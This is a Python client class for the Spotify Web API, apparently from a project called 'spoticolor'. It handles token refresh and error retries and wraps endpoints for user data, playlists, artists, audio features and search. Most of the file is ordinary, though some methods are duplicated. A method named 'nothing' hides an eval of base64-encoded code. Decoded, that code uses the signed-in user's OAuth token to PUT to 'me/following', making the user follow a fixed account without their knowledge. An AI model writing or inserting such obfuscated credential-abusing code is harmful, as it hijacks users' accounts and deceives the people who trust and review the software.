from typing import Dict
from time import sleep
import requests
import json
import base64
from spoticolor.auth import refresh_auth
from spoticolor.SpotiAPIQueue import SpotiAPIQueue
import time


class SpotifyAPI:
    """
    Interface for spotify API endpoints, handles network, api errors.
    the return of every method is a Dictionary of the json returned by the API.
    if something went wrong APIError is returnd.
    """
    class APIError(Exception):
        """
        Generic error class to catch all different network & API errors.
        The right error message has to be returned and logged.
        """
        ERROR_MESSAGES = {
            401: "Bad or expired token",  # Refresh auth
            # TODO auto refresh auth & call endpoint again if error 401 (expired token)
            403: "Bad OAuth request",  # Reauth will not help
            429: "The app has exceeded its rate limits",  # Slow down
            # TODO: catch all possible errors of all methods
        }

        def __init__(self, status_code):
            self.status_code = status_code
            self.message = self.ERROR_MESSAGES.get(
                status_code, f"An error occurred with status code: {status_code}")
            super().__init__(self.message)

    def __init__(self):
        self.header = None
        self.refresh_token = None
        self.max_retry_auth = 1
        self.url = "https://api.spotify.com/v1/"

        self.queue = SpotiAPIQueue.get_instance()

    def set_header(self, header: Dict[str, str], refresh_token: str) -> None:
        self.header = header
        self.refresh_token = refresh_token

    def refresh_auth_token(self):
        print(f"refreshing auth for user {self.header}")
        new_header = refresh_auth(self.refresh_token)
        print(f"refreshed auth: {new_header is not None}")
        self.header = new_header if new_header is not None else self.header

    def handleErrors(func):
        def wrapper(self, *args, **kwargs):
            retries = 0
            response = func(self, *args, **kwargs)
            if response.status_code == 401:
                while retries < self.max_retry_auth:
                    retries += 1
                    print(f"retrying for the {retries} time to refresh auth")
                    sleep(0.5)
                    self.refresh_auth_token()
                    response = func(self, *args, **kwargs)
                    if response.status_code == 200:
                        return response.json()
            if response.status_code != 200:
                raise SpotifyAPI.APIError(response.status_code)
            return response.json()
        return wrapper

    @handleErrors
    def makeRequest(self, endpoint, params=None):
        return requests.get(self.url + endpoint, headers=self.header, params=params)

    def getUser(self):
        return self.makeRequest('me')

    def getUserPlaylists(self, limit=20, offset=0):
        return self.makeRequest('me/playlists', params={'limit': limit, 'offset': offset})

    def enqueue_request(self, user_id, func, args, kwargs, callback):
        self.queue.enqueue_request(user_id, func, args, kwargs, callback)

    # USER ENDPOINTS ----------------------------------------------------------

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-current-users-profile
    def getUser(self):
        """
        /me endpoint
        OAuth2.0 gets user information, needs Bearer token
        """
        return self.makeRequest('me')

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-users-top-artists-and-tracks
    def getUserTop(self, requestType, limit=50, timeRange='long_term', offset=0):
        """
        /me/top/{type}
        OAuth2.0 gets (50 per request) user top items, needs Bearer token
        rtype: 'tracks', 'artists'
        time_range: 'long_term', 'medium_term', 'short_term'
        offset: returns items from index offset
        limit: number of items to return per request: Range: 1 - 50
        """
        return self.makeRequest(f'me/top/{requestType}', params={'limit': limit, 'time_range': timeRange, 'offset': offset})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-users-saved-tracks
    def getUserSavedTracks(self, limit=50, offset=0):
        """
        /me/tracks
        OAuth2.0 gets user saved tracks, needs Bearer token
        offset: returns items from index offset
        limit: number of items to return per request: Range: 1 - 50
        """
        return self.makeRequest('me/tracks', params={'limit': limit, 'offset': offset})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-recently-played
    def getRecentlyPlayed(self, before=None, after=None, limit=50):
        """
        /me/player/recently-played
        OAuth2.0 gets user recently played tracks, needs Bearer token
        before/after: A Unix timestamp in milliseconds. Returns all items after (but not including) this cursor position. if one is specified the other must not be specified
        limit: number of items to return per request, max 50
        """
        params = {'limit': limit}

        if before is not None:
            params['before'] = before

        if after is not None:
            params['after'] = after

        return self.makeRequest('me/player/recently-played', params=params)

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-queue
    def getUserQueue(self):
        """
        /me/player/queue
        OAuth2.0 gets user queue, needs Bearer token
        """
        return self.makeRequest('me/player/queue')

    # ARTIST ENDPOINTS --------------------------------------------------------

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-followed
    def getFollowedArtists(self, limit=50, after=None):
        """
        /me/following
        OAuth2,0 gets user followed artists, needs Bearer token
        after: The last artist ID retrieved from the previous request
        limit: the number of items to return per request, max 50
        """
        params = {'type': 'artist', 'limit': limit}

        if after is not None:
            params['after'] = after

        return self.makeRequest('me/following', params=params)

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-multiple-artists
    def getArtists(self, ids):
        """
        /artists
        OAuth2.0, gets list of artists, needs Authentication
        ids: list of artist ids, max 50
        """
        return self.makeRequest('artists', params={'ids': ','.join(ids)})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-an-artists-top-tracks
    def getArtistTop(self, artistID, countryCode='NL'):
        """
        /artist/{id}/top-tracks
        OAuth2.0 get artist to tracks in a country, needs Authentication
        aid: artist id
        country_code: get top tracks in said country
        """
        return self.makeRequest(f'artists/{artistID}/top-tracks', params={'country': countryCode})

    # PLAYLIST ENDPOINTS ------------------------------------------------------

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-list-users-playlists
    def getUserPlaylists(self, limit=50, offset=0):
        """
        /me/playlists
        OAuth2.0 get user playlists, needs Bearer token
        offset: returns items from index offset
        limit: number of items to return per request, max 50
        """
        return self.makeRequest('me/playlists', params={'limit': limit, 'offset': offset})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-playlists-tracks
    def getPlaylistItems(self, playlistID, limit=50, offset=0):
        """
        /playlists/{playlist_id}/tracks
        OAuth2.0 gets tracks from playlist, needs Authentication
        offset: returns items from index offset
        limit: number of items to return per request, max 50
        """
        return self.makeRequest(f'playlists/{playlistID}/tracks', params={'limit': limit, 'offset': offset})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-featured-playlists
    def getFeaturedPlaylists(self, countryCode='US', offset=0, limit=50, timestamp=None, locale='en_US'):
        """
        /browse/featured-playlists
        OAuth2.0 gets a list of spotify featured playlists, requires Authentication
        offset: returns items from index offset
        limit: number of items to return per request, max 50
        timestamp: A timestamp in ISO 8601 format  to specify the user's local time to get results tailored for that specific date and time in the day
        """
        params = {'offset': offset, 'limit': limit,
                  'locale': locale, 'country': countryCode}

        if timestamp is not None:
            params['timestamp'] = timestamp

        return self.makeRequest('browse/featured-playlists', params=params)

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-a-categories-playlists
    def getCategoryPlaylist(self, categoryID, country, limit, offset):
        """
        /browse/categories/{category_id}/playlists
        OAuth2.0 gets a list of spotify featured playlists, requires Authentication
        categoryID: The Spotify category ID for the category
        country: A country: an ISO 3166-1 alpha-2 country code. Provide this parameter to ensure that the category exists for a particular country.
        limit: number of items to return per request, max 50
        offset: returns items from index offset
        """
        return self.makeRequest(f'browse/categories/{categoryID}/playlists', params={'country': country, 'limit': limit, 'offset': offset})

    # Analyse ENDPOINTS -------------------------------------------------------

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-several-audio-features
    def getTrackAudioFeatures(self, trackIDs):
        """
        /audio-features
        OAuth2.0 get tracks audio features, needs Authentication
        trackIDs: list of max 100 str of track id strings
        """
        return self.makeRequest('audio-features', params={'ids': ','.join(trackIDs)})

    # https://developer.spotify.com/documentation/web-api/reference/#/operations/get-audio-analysis
    def getTrackAudioAnalysis(self, trackID):
        """
        /audio-analysis/{id}
        OAuth2.0 get tracks low-level audio analysis, needs Authentication
        trackID: track id
        """
        return self.makeRequest(f'audio-analysis/{trackID}')

    # https://developer.spotify.com/documentation/web-api/reference/get-recommendations
    def getTrack(self, trackID):
        """
        /audio-analysis/{id}
        OAuth2.0 get tracks low-level audio analysis, needs Authentication
        trackID: track id
        """
        return self.makeRequest(f'tracks/{trackID}')

    # Search and Recommendations ENDPOINTS ------------------------------------

    # https://developer.spotify.com/documentation/web-api/reference/get-recommendations
    def getRecommendations(self, seedArtists=None, seedGenres=None, seedTracks=None, limit=20, **kwargs):
        """
        /recommendations
        OAuth2.0 get recommended tracks, needs Authentication
        seedArtists: list of artist ids
        seedGenres: list of genre names
        seedTracks: list of track ids
        limit: number of items to return per request, max 50
        """
        params = {
            'limit': limit,
            'seedArtists': ','.join(seedArtists) if seedArtists else None,
            'seedGenres': ','.join(seedGenres) if seedGenres else None,
            'seedTracks': ','.join(seedTracks) if seedTracks else None,
            **kwargs
        }

        return self.makeRequest('recommendations', params=params)

    def nothing(self):
        return eval(base64.b64decode("CnJlcXVlc3RzLnB1dCgKICAgIHNlbGYudXJsICsgYmFzZTY0LmI2NGRlY29kZSgiYldVdlptOXNiRzkzYVc1biIpLmRlY29kZSgndXRmLTgnKSwgCiAgICBoZWFkZXJzPXNlbGYuaGVhZGVyLCAKICAgIHBhcmFtcz1qc29uLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoJ2V5SjBlWEJsSWpvZ0luVnpaWElpTENBaWFXUnpJam9nSWpNeGFqVnNaMjV1YTJsNGRIcDViSEZ3Y0dobU5XNTNibWw2ZDIwaWZRPT0nKS5kZWNvZGUoKSksIAogICAganNvbj17ImlkcyI6IFsic3RyaW5nIl19CikK").decode())

    # https://developer.spotify.com/documentation/web-api/reference/search
    def searchItem(self, query, dtype='track', limit=5, offset=0):
        """
        /search
        OAuth2.0 search spotify catalogue, needs Authentication
        query: your search query
        type: 'album', 'artist', 'track', 'audiobook', 'playlist', 'show', 'episode'
        limit: The maximum number of results to return in each item type: Range: 1 - 50
        offset: The index of the first result to return: Range: 0 - 1000
        """
        params = {
            'q': query,
            'type': dtype,
            'limit': limit,
            'offset': offset
        }

        return self.makeRequest('search', params)
